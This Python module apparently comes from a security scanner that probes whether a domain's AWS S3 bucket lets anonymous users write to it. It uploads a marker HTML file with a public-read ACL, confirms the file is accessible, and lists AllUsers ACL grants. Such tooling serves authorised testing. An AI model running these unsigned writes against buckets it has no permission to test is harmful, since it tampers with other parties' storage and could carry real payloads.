from .linker import *

upload_name = 'domainker_aws_poc.html'
upload_body = "<html><!-- DOMAINKER_TAKEOVER(This is a vulnerable host) --></html>"

@helpers.on_error("Access Denied")
def tkaws(bucket):
	s3 = boto3.client('s3', config=Config(signature_version=UNSIGNED))
	s3.put_object(Bucket=bucket, Key=upload_name,ACL='public-read', Body=StringIO(str(upload_body)).read())
	response = requests.get("http://{bucket}.s3.amazonaws.com/{target}".format(bucket=bucket,target=upload_name)).text
	if upload_body in response:
		return "%sFile Uploaded And Accessable %s::%s %s%s" %(
					Fore.GREEN,
					Fore.YELLOW,
					Fore.LIGHTWHITE_EX,
					"http://{bucket}.s3.amazonaws.com/{target}".format(bucket=bucket,target=upload_name),
					Fore.RESET
				)
	else:
		return "%sFile Uploaded And not Accessable%s" %(Fore.BLUE,Fore.RESET)


@helpers.on_error("Access Denied")
def chkacl(bucket):
	allUsersGrants = []
	s3 = boto3.resource('s3')
	s3.meta.client.meta.events.register('choose-signer.s3.*', disable_signing)
	bucket_acl = s3.BucketAcl(bucket)
	bucket_acl.load()

	for grant in bucket_acl.grants:
		if 'URI' in grant['Grantee']:
			if grant['Grantee']['URI'] == "http://acs.amazonaws.com/groups/global/AllUsers":
				allUsersGrants.append(grant['Permission'])	
	ret = ""			
	for p in allUsersGrants:
		ret += "%s%s%s," % (Fore.LIGHTCYAN_EX,p,Fore.RESET)
	ret = ret[:-1]
	return ret



@helpers.on_error("Unreachable")
def chkaws(endpoint,timeout):
	bucket = helpers.urlify(endpoint).host
	aws = requests.head("http://%s.s3.amazonaws.com" % bucket,timeout=timeout)

	if aws.status_code == 404:
		return '%sNo [AWS] Bucket Associated With The Endpoint' % (Fore.RED)
	else:
		msg = '%sFound [AWS] Bucket %s::%s ' "http://%s.s3.amazonaws.com%s" % (Fore.GREEN,Fore.YELLOW,Fore.LIGHTWHITE_EX,bucket,Fore.RESET)
		msg += '\n        |> Upload Result [%s]' % tkaws(bucket)
		msg += '\n        |> Acl Result [%s]' % chkacl(bucket)
		return msg

